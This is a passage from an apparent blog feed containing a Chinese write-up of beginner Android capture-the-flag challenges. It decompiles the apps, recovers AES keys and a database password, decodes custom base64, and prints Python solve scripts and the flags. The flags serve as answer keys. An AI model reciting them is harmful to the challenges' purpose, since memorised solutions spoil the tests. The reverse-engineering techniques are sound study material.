rel="noopener">https://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</a><br><a href="https://bbs.pediy.com/thread-248322.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248322.htm</a><br><a href="https://www.renyiwei.com/archives/1704.html" target="_blank" rel="noopener">https://www.renyiwei.com/archives/1704.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-MOBILE-新手练习区</title>
    <link href="blog.b3ale.cn/2020/02/20/%5BTODO%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MOBILE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>blog.b3ale.cn/2020/02/20/%5BTODO%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MOBILE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2020-02-20T11:51:47.000Z</published>
    <updated>2020-04-25T03:30:52.661Z</updated>
    
    <content type="html"><![CDATA[<p>持续更新。</p><a id="more"></a><h1 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h1><p>将 apk 拖入 jadx 进行反编译，查看入口点 MainActivity 代码：</p><pre><code class="java">package com.example.yaphetshan.tencentgreat;import android.content.pm.PackageInfo;import android.content.pm.PackageManager.NameNotFoundException;import android.os.Bundle;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    Button btn;    public final String pName = BuildConfig.APPLICATION_ID;    EditText text;    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        this.btn = (Button) findViewById(R.id.checBtn);        this.text = (EditText) findViewById(R.id.input);        this.btn.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                try {                    String inputString = MainActivity.this.text.getText().toString();                    PackageInfo pinfo = MainActivity.this.getPackageManager().getPackageInfo(BuildConfig.APPLICATION_ID, AccessibilityNodeInfoCompat.ACTION_COPY);                    String versionCode = pinfo.versionName; // 获取包信息中的versionName                    int versionName = pinfo.versionCode; // 获取包信息中的versionCode                    int i = 0;                    while (i &lt; inputString.length() &amp;&amp; i &lt; versionCode.length()) {                        if (inputString.charAt(i) != (versionCode.charAt(i) ^ versionName)) { // 将versionCode中的每一字节和versionName异或并和输入比较                            Toast.makeText(MainActivity.this, &quot;\u518d\u63a5\u518d\u5389\uff0c\u52a0\u6cb9~&quot;, 1).show(); // 再接再厉，加油~                            return;                        }                        i++;                    }                    if (inputString.length() == versionCode.length()) { // 判断输入的长度和versionCode是否相同                        Toast.makeText(MainActivity.this, &quot;\u606d\u559c\u5f00\u542f\u95ef\u5173\u4e4b\u95e8\uff01&quot;, 1).show(); // 恭喜开启闯关之门！                        return;                    }                } catch (NameNotFoundException e) {                }                Toast.makeText(MainActivity.this, &quot;\u5e74\u8f7b\u4eba\u4e0d\u8981\u800d\u5c0f\u806a\u660e\u5662&quot;, 1).show(); // 年轻人不要耍小聪明噢            }        });    }}</code></pre><p>代码中可以判断出是将 versionCode 和 versionName 进行异或然后和输入比较，具体信息可以在 AndroidManifest.xml 中找到：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;15&quot; android:versionName=&quot;X&lt;cP[?PHNB&lt;P?aj&quot; package=&quot;com.example.yaphetshan.tencentgreat&quot; platformBuildVersionCode=&quot;25&quot; platformBuildVersionName=&quot;7.1.1&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;19&quot; android:targetSdkVersion=&quot;25&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;meta-data android:name=&quot;android.support.VERSION&quot; android:value=&quot;25.3.0&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot; android:supportsRtl=&quot;true&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;&gt;        &lt;activity android:name=&quot;com.example.yaphetshan.tencentgreat.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>编写脚本来得到 flag：</p><pre><code class="python">#!/usr/bin/env pythonversionCode = 15versionName = &quot;X&lt;cP[?PHNB&lt;P?aj&quot;flag = &#39;&#39;for c in versionName:    flag += chr(ord(c) ^ versionCode)print flag# W3l_T0_GAM3_0ne</code></pre><h1 id="app2"><a href="#app2" class="headerlink" title="app2"></a>app2</h1><p>先使用 jadx 反编译，查看入口点的代码，在两个输入框中输入字符串后会去调用 SecondActivity：</p><pre><code class="java">package com.tencent.testvuln;import android.annotation.SuppressLint;import android.app.Activity;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.os.Handler;import android.support.v4.BuildConfig;import android.util.Log;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import com.tencent.testvuln.c.SignatureTool;@SuppressLint({&quot;ShowToast&quot;})public class MainActivity extends Activity implements OnClickListener {    private Button a;    private Handler b = null;    private EditText c;    private EditText d;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main);        this.a = (Button) findViewById(R.id.button1);        this.a.setOnClickListener(this);        this.c = (EditText) findViewById(R.id.editText1);        this.d = (EditText) findViewById(R.id.editText2);        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putLong(&quot;ili&quot;, System.currentTimeMillis());        edit.commit();        Log.d(&quot;hashcode&quot;, SignatureTool.getSignature(this) + BuildConfig.VERSION_NAME);    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.main, menu);        return true;    }    public boolean onOptionsItemSelected(MenuItem menuItem) {        if (menuItem.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(menuItem);    }    public void onClick(View view) {        switch (view.getId()) {            case R.id.button1:                if (this.c.getText().length() == 0 || this.d.getText().length() == 0) {                    Toast.makeText(this, &quot;\u4e0d\u80fd\u4e3a\u7a7a&quot;, 1).show(); // 不能为空                    return;                }                String obj = this.c.getText().toString(); // 获取第一个输入框中的字符串                String obj2 = this.d.getText().toString(); // 获取第二个输入框中的字符串                Log.e(&quot;test&quot;, obj + &quot; test2 = &quot; + obj2);                Intent intent = new Intent(this, SecondActivity.class); // 设置Intent跳转到SecondActivity                intent.putExtra(&quot;ili&quot;, obj); // 设置变量ili的值为obj的值                intent.putExtra(&quot;lil&quot;, obj2); // 设置变量lil的值为obj2的值                startActivity(intent); // 调用SecondActivity                return;            default:                return;        }    }}</code></pre><p>接下来看看 SecondActivity，将输入的字符串拼接起来，经过 Encryto.doRawData 的操作后和一串 base64 进行比较：</p><pre><code class="java">package com.tencent.testvuln;import android.content.BroadcastReceiver;import android.content.Context;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.view.Menu;import android.view.MenuItem;import android.widget.Toast;import com.tencent.testvuln.c.Encryto;public class SecondActivity extends a {    private BroadcastReceiver c = new BroadcastReceiver(this) {        final /* synthetic */ SecondActivity a;        {            this.a = r1;        }        public void onReceive(Context context, Intent intent) {            Toast.makeText(context, &quot;myReceiver receive&quot;, 0).show();            if (!context.getPackageName().equals(intent.getAction())) {            }        }    };    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main2);        Intent intent = getIntent();        String stringExtra = intent.getStringExtra(&quot;ili&quot;); // obj        String stringExtra2 = intent.getStringExtra(&quot;lil&quot;); // obj2        if (Encryto.doRawData(this, stringExtra + stringExtra2).equals(&quot;VEIzd/V2UPYNdn/bxH3Xig==&quot;)) { // 判断obj+obj2经过Encryto.doRawData后是否等于指定字符串            intent.setAction(&quot;android.test.action.MoniterInstallService&quot;);            intent.setClass(this, MoniterInstallService.class);            intent.putExtra(&quot;company&quot;, &quot;tencent&quot;);            intent.putExtra(&quot;name&quot;, &quot;hacker&quot;);            intent.putExtra(&quot;age&quot;, 18);            startActivity(intent);            startService(intent);        }        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putString(&quot;ilil&quot;, stringExtra);        edit.putString(&quot;lili&quot;, stringExtra2);        edit.commit();    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.main, menu);        return true;    }    public boolean onOptionsItemSelected(MenuItem menuItem) {        if (menuItem.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(menuItem);    }}</code></pre><p>然后我找到了 Encryto.doRawData 函数的位置。可以看到这里的所有函数都是在 Native 层实现的：</p><pre><code class="java">package com.tencent.testvuln.c;public class Encryto {    public static native int checkSignature(Object obj);    public static native String decode(Object obj, String str);    public static native String doRawData(Object obj, String str);    public static native String encode(Object obj, String str);    public native String HelloLoad();    static {        System.loadLibrary(&quot;JNIEncrypt&quot;);    }}</code></pre><p>用 IDA 打开 libJNIEncrypt.so，然后定位到 JNI_OnLoad，并找到被动态注册的函数：</p><pre><code>.data:00006008 off_6008        DCD aChecksignature_0   ; DATA XREF: register_ndk_load+22↑o.data:00006008                                         ; .text:off_221C↑o.data:00006008                                         ; &quot;checkSignature&quot;.data:0000600C                 DCD aLjavaLangObjec     ; &quot;(Ljava/lang/Object;)I&quot;.data:00006010                 DCD check+1.data:00006014                 DCD aDecode_0           ; &quot;decode&quot;.data:00006018                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:0000601C                 DCD decode+1.data:00006020                 DCD aEncode_0           ; &quot;encode&quot;.data:00006024                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:00006028                 DCD encode+1.data:0000602C                 DCD aDorawdata_0        ; &quot;doRawData&quot;.data:00006030                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:00006034                 DCD doRawData+1.data:00006034 ; .data         ends</code></pre><p>看一下其中的 doRawData 函数，发现其中调用了一个 j_AES_128_ECB_PKCS5Padding_Encrypt 函数，可以大概推断出经过了 AES-128 的加密，且加密模式用了 ECB，Padding 用了 PKCS5：</p><pre><code class="cpp">int __fastcall doRawData(_JNIEnv *env, int a2, int a3, char *string){  _JNIEnv *v4; // r4  char *v5; // r9  const char *utf_string; // r6  int ciphertext; // r8  int result; // r0  jstring (__cdecl *v9)(JNIEnv *, const jchar *, jsize); // r6  char *v10; // r5  size_t v11; // r2  int key; // [sp+0h] [bp-28h]  int v13; // [sp+18h] [bp-10h]  v4 = env;  v5 = string;  if ( j_checkSignature((int)env, a2, a3) == 1    &amp;&amp; (strcpy((char *)&amp;key, &quot;thisisatestkey==&quot;),        utf_string = (const char *)((int (__fastcall *)(_JNIEnv *, char *, _DWORD))v4-&gt;functions-&gt;GetStringUTFChars)(                                     v4,                                     v5,                                     0),        ciphertext = j_AES_128_ECB_PKCS5Padding_Encrypt(utf_string, (int)&amp;key),        ((void (__fastcall *)(_JNIEnv *, char *, const char *))v4-&gt;functions-&gt;ReleaseStringUTFChars)(v4, v5, utf_string),        result = ((int (__fastcall *)(_JNIEnv *, int))v4-&gt;functions-&gt;NewStringUTF)(v4, ciphertext),        _stack_chk_guard == v13) )  {    return result;  }  do  {    v9 = v4-&gt;functions-&gt;NewString;    v10 = UNSIGNATURE[0];    v11 = strlen(UNSIGNATURE[0]);  }  while ( _stack_chk_guard != v13 );  result = ((int (__fastcall *)(_JNIEnv *, char *, size_t))v9)(v4, v10, v11);  return result;}</code></pre><p>然后进去看到加密完成之后进行了 base64 加密在返回密文：</p><pre><code class="cpp">int __fastcall AES_128_ECB_PKCS5Padding_Encrypt(const char *a1, int a2){  int v2; // r9  const char *v3; // r10  signed int v4; // r0  signed int v5; // r5  _BYTE *v6; // r11  signed int v7; // r0  const char *v8; // r1  signed int v9; // r8  char *v10; // r10  int v11; // r5  _BYTE *v12; // r0  signed int v13; // r2  char v14; // r6  int v15; // r6  int v16; // r4  int v17; // r5  v2 = a2;  v3 = a1;  v4 = strlen(a1);  v5 = v4;  if ( v4 &lt;= 15 )  {    v6 = malloc(0x10u);    v7 = 0;    do    {      v8 = &amp;byte_3BB0[16 - v5];      if ( v7 &lt; v5 )        v8 = &amp;v3[v7];      v6[v7++] = *v8;    }    while ( v7 != 16 );    v9 = 16;    v10 = (char *)malloc(0x10u);    v11 = 1;LABEL_18:    v15 = 0;    v16 = 0;    do    {      j_AES128_ECB_encrypt(&amp;v6[v15], v2, &amp;v10[v15]);      ++v16;      v15 += 16;    }    while ( v16 &lt; v11 );    goto LABEL_22;  }  v9 = (v4 + 16) &amp; 0xFFFFFFF0;  v12 = malloc(v9);  v6 = v12;  if ( v9 &lt;= 0 )  {    v10 = (char *)malloc((v5 + 16) &amp; 0xFFFFFFF0);    goto LABEL_22;  }  v13 = 0;  do  {    if ( v13 &gt;= v5 )    {      if ( !(v5 &amp; 0xF) )      {        v12[v13] = 16;        goto LABEL_15;      }      v14 = byte_3BB0[v9 - v5];    }    else    {      v14 = v3[v13];    }    v12[v13] = v14;LABEL_15:    ++v13;  }  while ( v9 != v13 );  v10 = (char *)malloc((v5 + 16) &amp; 0xFFFFFFF0);  if ( v9 &gt;= 16 )  {    v11 = v9 / 16;    goto LABEL_18;  }LABEL_22:  v17 = j_b64_encode((int)v10, v9);  free(v6);  free(v10);  return v17;}</code></pre><p>用 Python 脚本解密得到明文：</p><pre><code class="python">#!/usr/bin/env pythonfrom Crypto.Cipher import AESkey = &#39;thisisatestkey==&#39;aes = AES.new(key, AES.MODE_ECB)ciphertext = &#39;VEIzd/V2UPYNdn/bxH3Xig==&#39;.decode(&#39;base64&#39;)print aes.decrypt(ciphertext)# aimagetencent</code></pre><p>尝试提交这串字符串提示错误，再尝试用这字符串登录也没得到什么结果，那么继续往下分析。发现其中调用了多次 Intent，还设置了 IntentFilter，看的眼花缭乱都没找到 flag 在哪里。再去尝试一下交叉引用，看看哪些类调用了 Encryto 类，发现了 FileDataActivity 类中调用了 decode 方法，在 IDA 中可以发现 decode 和 doRawData 的功能一模一样：</p><pre><code class="java">package com.tencent.testvuln;import android.os.Bundle;import android.widget.TextView;import com.tencent.testvuln.c.Encryto;public class FileDataActivity extends a {    private TextView c;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main3);        this.c = (TextView) findViewById(R.id.textView1);        this.c.setText(Encryto.decode(this, &quot;9YuQ2dk8CSaCe7DTAmaqAA==&quot;));    }}</code></pre><p>最后用这里的密文解密得到了 flag：</p><pre><code class="python">...ciphertext2 = &#39;9YuQ2dk8CSaCe7DTAmaqAA==&#39;.decode(&#39;base64&#39;)print aes.decrypt(ciphertext2)# Cas3_0f_A_CAK3</code></pre><h1 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h1><p>拿到文件用 file 没有识别出来，xxd 看一下：</p><pre><code class="bash">$ xxd app3.ab | head00000000: 414e 4452 4f49 4420 4241 434b 5550 0a32  ANDROID BACKUP.200000010: 0a31 0a6e 6f6e 650a 78da e47a e55f 936f  .1.none.x..z._.o00000020: fcaf 8a74 8e1e 0d1b 5d63 0361 303a 4797  ...t....]c.a0:G.00000030: 8422 3d06 8ab4 c248 a507 a373 3046 2328  .&quot;=....H...s0F#(00000040: 2a65 a088 d20c 4623 8222 4883 a252 5202  *e....F#.&quot;H..RR.00000050: 9e7d 7fe7 75fe 80f3 e43c 39d7 93fb 75bf  .}..u....&lt;9...u.00000060: b6dd d775 7de2 1df7 2e8f a0a0 5045 afc0  ...u}.......PE..00000070: bb0a a808 8fbb 41fe 2805 8c47 902f 2a2c  ......A.(..G./*,00000080: d4d7 2340 210c 15e0 850a 080b 47f9 53be  ..#@!.......G.S.00000090: 8052 f450 f4f4 0845 2978 04dd b9f4 7f37  .R.P...E)x.....7</code></pre><p>搜了一下发现是安卓备份文件，可以用 Android Backup Extractor 来解压：</p><pre><code class="bash">$ java -jar abe.jar unpack app3.ab app3.tar &quot;&quot;0% 1% 2% 3% 4% 5% 6% 7% 8% 9% 10% 11% 12% 13% 14% 15% 16% 17% 18% 19% 20% 21% 22% 23% 24% 25% 26% 27% 28% 29% 30% 31% 32% 33% 34% 35% 36% 37% 38% 39% 40% 41% 42% 43% 44% 45% 46% 47% 48% 49% 50% 51% 52% 53% 54% 55% 56% 57% 58% 59% 60% 61% 62% 63% 64% 65% 66% 67% 68% 69% 70% 71% 72% 73% 74% 75% 76% 77% 78% 79% 80% 81% 82% 83% 84% 85% 86% 87% 88% 89% 90% 91% 92% 93% 94% 95% 96% 97% 98% 99% 100%9097216 bytes written to /Users/assassinq/Downloads/app3.tar.</code></pre><p>在解压得到的 tar 包：</p><pre><code class="bash">$ x app3.tarx apps/com.example.yaphetshan.tencentwelcome/a/base.apkx apps/com.example.yaphetshan.tencentwelcome/db/Demo.dbx apps/com.example.yaphetshan.tencentwelcome/Encryto.dbx apps/com.example.yaphetshan.tencentwelcome/_manifest</code></pre><p>生成的文件中，两个 db 都是被加密了的 sqlite 数据库。先来用 jadx 看看 base.apk，可以看到 <code>a()</code> 函数通过一些操作计算出一个密码，来获得一个数据库的接口。详细分析我记录在了注释中，其他的分析再看之后的函数：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome;import android.content.ContentValues;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import com.example.yaphetshan.tencentwelcome.a.a;import net.sqlcipher.database.SQLiteDatabase;public class MainActivity extends AppCompatActivity implements OnClickListener {    private SQLiteDatabase a;    private a b;    private Button c;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        this.c = (Button) findViewById(R.id.add_data);        this.c.setOnClickListener(this);        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putString(&quot;Is_Encroty&quot;, &quot;1&quot;); // Is_Encroty=&quot;1&quot;        edit.putString(&quot;Encryto&quot;, &quot;SqlCipher&quot;); // Encryto=&quot;SqlCipher&quot;        edit.putString(&quot;ver_sion&quot;, &quot;3_4_0&quot;); // ver_sion=&quot;3_4_0&quot;        edit.apply();        a();    }    private void a() {        SQLiteDatabase.loadLibs(this);        this.b = new a(this, &quot;Demo.db&quot;, null, 1); // 打开Demo.db        ContentValues contentValues = new ContentValues();        contentValues.put(&quot;name&quot;, &quot;Stranger&quot;); // name=&quot;Stanger&quot;        contentValues.put(&quot;password&quot;, Integer.valueOf(123456)); // password=123456        a aVar = new a();        String a = aVar.a(contentValues.getAsString(&quot;name&quot;), contentValues.getAsString(&quot;password&quot;)); // a = name[:4] + password[:4]        this.a = this.b.getWritableDatabase(aVar.a(a + aVar.b(a, contentValues.getAsString(&quot;password&quot;))).substring(0, 7)); // 将SHA1(a+MD5(a)+&quot;yaphetshan&quot;)[:7]作为密码，获取指定数据库接口        this.a.insert(&quot;TencentMicrMsg&quot;, null, contentValues); // 将数据contentValues插入表TencentMicrMsg    }    public void onClick(View view) {        if (view == this.c) {            Intent intent = new Intent();            intent.putExtra(&quot;name&quot;, &quot;name&quot;);            intent.putExtra(&quot;password&quot;, &quot;pass&quot;);            intent.setClass(this, AnotherActivity.class);            startActivity(intent);        }    }}</code></pre><p>在同一包下的 a 类中，看到了数据库 TencentMicrMsg 的结构，其中有一个 F_l_a_g 字段，可以判断是 flag：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome;import android.content.Context;import net.sqlcipher.database.SQLiteDatabase;import net.sqlcipher.database.SQLiteDatabase.CursorFactory;import net.sqlcipher.database.SQLiteOpenHelper;/* compiled from: DatabaseManager */public class a extends SQLiteOpenHelper {    private int a = 0;    public a(Context context, String str, CursorFactory cursorFactory, int i) { // 打开指定数据库        super(context, str, cursorFactory, i);    }    public void onCreate(SQLiteDatabase sQLiteDatabase) {        sQLiteDatabase.execSQL(&quot;create table TencentMicrMsg(name text,password integer,F_l_a_g text)&quot;); // 表TencentMicrMsg中三个字段分别是text、integer和text    }    public void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) {    }}</code></pre><p>在包 a 下的 a 类，其中两个函数可以根据 b 类的函数分析得到功能：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome.a;/* compiled from: Cipher */public class a {    private String a = &quot;yaphetshan&quot;;    public String a(String str, String str2) {        String substring = str.substring(0, 4);        return substring + str2.substring(0, 4);    }    public String b(String str, String str2) { // 返回MD5十六进制字符串        b bVar = new b();        return b.a(str);    }    public String a(String str) { // 返回SHA1(str+&quot;yaphetshan&quot;)的十六进制字符串        b bVar = new b();        return b.b(str + this.a);    }}</code></pre><p>包 a 下的 b 类，根据 MessageDigest 创建的实例可以分别判断出是获取 MD5 和 SHA-1 的十六进制摘要：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome.a;import java.security.MessageDigest;/* compiled from: SHA1Manager */public class b {    public static final String a(String str) { // 获取MD5十六进制字符串        int i = 0;        char[] cArr = new char[]{&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;};        try {            byte[] bytes = str.getBytes();            MessageDigest instance = MessageDigest.getInstance(&quot;MD5&quot;);            instance.update(bytes);            byte[] digest = instance.digest(); // 获取MD5哈希摘要            int length = digest.length;            char[] cArr2 = new char[(length * 2)];            int i2 = 0;            while (i &lt; length) {                byte b = digest[i];                int i3 = i2 + 1;                cArr2[i2] = cArr[(b &gt;&gt;&gt; 4) &amp; 15];                i2 = i3 + 1;                cArr2[i3] = cArr[b &amp; 15];                i++;            }            return new String(cArr2);        } catch (Exception e) {            return null;        }    }    public static final String b(String str) { // 获取SHA1十六进制字符串        int i = 0;        char[] cArr = new char[]{&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;};        try {            byte[] bytes = str.getBytes();            MessageDigest instance = MessageDigest.getInstance(&quot;SHA-1&quot;);            instance.update(bytes);            byte[] digest = instance.digest(); // 获取SHA1哈希摘要            int length = digest.length;            char[] cArr2 = new char[(length * 2)];            int i2 = 0;            while (i &lt; length) {                byte b = digest[i];                int i3 = i2 + 1;                cArr2[i2] = cArr[(b &gt;&gt;&gt; 4) &amp; 15];                i2 = i3 + 1;                cArr2[i3] = cArr[b &amp; 15];                i++;            }            return new String(cArr2);        } catch (Exception e) {            return null;        }    }}</code></pre><p>那么根据上面的分析可以正向地得到密码：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibmd5hash = lambda m: hashlib.md5(m).hexdigest()sha1hash = lambda m: hashlib.sha1(m).hexdigest()name = &quot;Stranger&quot;password = &quot;123456&quot;a = name[:4] + password[:4]database = sha1hash(a + md5hash(a) + &quot;yaphetshan&quot;)[:7]print database# ae56f99</code></pre><p>打开 Decypt.db 库，查看表中数据：</p><p><img src="/pics/攻防世界-MOBILE-新手练习区/1.png" srcset="/img/loading.gif" alt></p><p>将字段中的字符串解 base64：</p><pre><code class="bash">$ echo &quot;VGN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0=&quot; | base64 -DTctf{H3ll0_Do_Y0u_Lov3_Tenc3nt!}</code></pre><h1 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy-apk"></a>easy-apk</h1><p>把 apk 拖进 jadx，反编译查看入口事件代码，判断出对输入进行了 Base64 加密：</p><pre><code class="java">package com.testjava.jack.pingan1;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() {            public void onClick(View view) {                if (new Base64New().Base64Encode(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString().getBytes()).equals(&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&quot;)) {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u901a\u8fc7!&quot;, 1).show(); // 验证通过!                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u5931\u8d25!&quot;, 1).show(); // 验证失败!                }            }        });    }}</code></pre><p>再看看 Base64New 类中代码，发现是一个换表的 base64：</p><pre><code class="java">package com.testjava.jack.pingan1;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;public class Base64New {    private static final char[] Base64ByteToStr = new char[]{&#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;y&#39;, &#39;z&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;8&#39;, &#39;9&#39;, &#39;+&#39;, &#39;/&#39;};    private static final int RANGE = 255;    private static byte[] StrToBase64Byte = new byte[AccessibilityNodeInfoCompat.ACTION_CLEAR_ACCESSIBILITY_FOCUS];    public String Base64Encode(byte[] bytes) {        StringBuilder res = new StringBuilder();        for (int i = 0; i &lt;= bytes.length - 1; i += 3) {            int k;            byte[] enBytes = new byte[4];            byte tmp = (byte) 0;            for (k = 0; k &lt;= 2; k++) {                if (i + k &lt;= bytes.length - 1) {                    enBytes[k] = (byte) (((bytes[i + k] &amp; RANGE) &gt;&gt;&gt; ((k * 2) + 2)) | tmp);                    tmp = (byte) ((((bytes[i + k] &amp; RANGE) &lt;&lt; (((2 - k) * 2) + 2)) &amp; RANGE) &gt;&gt;&gt; 2);                } else {                    enBytes[k] = tmp;                    tmp = (byte) 64;                }            }            enBytes[3] = tmp;            for (k = 0; k &lt;= 3; k++) {                if (enBytes[k] &lt;= (byte) 63) {                    res.append(Base64ByteToStr[enBytes[k]]);                } else {                    res.append(&#39;=&#39;);                }            }        }        return res.toString();    }}</code></pre><p>直接改表解码：</p><pre><code class="python">#!/usr/bin/env python#-*- encoding=utf-8 -*-from utils import *base64_charset = &#39;vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/=&#39;ciphertext = &#39;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&#39;plaintext = decipher(ciphertext)print plaintext# 05397c42f9b6da593a3644162d36eb01</code></pre><h1 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h1><p>jadx 反编译，MainActivity 中看到主要是 <code>b()</code> 函数判断了 flag 的格式，下面主要是把 a 和 b 两个类的构造函数理清：</p><pre><code class="java">package com.a.easyjava;import android.os.Bundle;import android.support.v7.app.c;import android.view.View;import android.view.View.OnClickListener;import android.widget.EditText;import android.widget.Toast;import java.util.Timer;import java.util.TimerTask;public class MainActivity extends c {    private static char a(String str, b bVar, a aVar) {        return aVar.a(bVar.a(str));    }    private static Boolean b(String str) {        int i = 0;        if (!str.startsWith(&quot;flag{&quot;)) {            return Boolean.valueOf(false);        }        if (!str.endsWith(&quot;}&quot;)) {            return Boolean.valueOf(false);        }        String substring = str.substring(5, str.length() - 1);        b bVar = new b(Integer.valueOf(2));        a aVar = new a(Integer.valueOf(3));        StringBuilder stringBuilder = new StringBuilder();        int i2 = 0;        while (i &lt; substring.length()) {            stringBuilder.append(a(substring.charAt(i) + &quot;&quot;, bVar, aVar));            Integer valueOf = 